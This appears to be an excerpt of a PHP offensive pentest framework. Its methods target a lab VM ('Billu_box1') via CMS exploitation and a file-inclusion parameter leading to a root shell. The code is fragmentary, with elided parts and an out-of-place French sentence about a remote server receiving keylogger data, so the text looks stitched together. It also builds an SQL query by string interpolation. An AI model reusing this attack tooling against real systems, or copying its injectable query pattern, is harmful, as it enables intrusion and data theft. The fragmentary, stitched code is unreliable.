...
class poc4web extends poc4service{
    ...
    public function poc4web($eth,$domain,$web,$fonction2exec){
        ...
        $flag_poc = FALSE;
        //$flag_poc = TRUE;
        $obj_web->poc($flag_poc);
        $query = "DELETE FROM LAN where id8port = '$obj_web->port2id' ";
        $this->cmd("mysql>", $query);
        $obj_web->mysql_ressource->query($query);
        
        $obj_web->$fonction2exec();
    }
    
    public function poc4web2shell8exploit8cms(){ // 
        $this->ssTitre(__FUNCTION__);
        $fonction2exec = "web4pentest8cms";        
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
...
Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pour fonction la reception des donnees envoyees par le keylogger.
    ...
    public function poc4web2shell8param2lfi4enum2root(){ //
        $this->ssTitre(__FUNCTION__);
        $this->flag_poc = TRUE ;
        //$this->flag_poc = FALSE ;
        
        
        $ip = "10.60.10.182"; // Billu_box1
        $port = 80 ;
        
        $uri = "/test.php?file=index.php";
        $param = "IP";
        $value = "10.60.10.1";
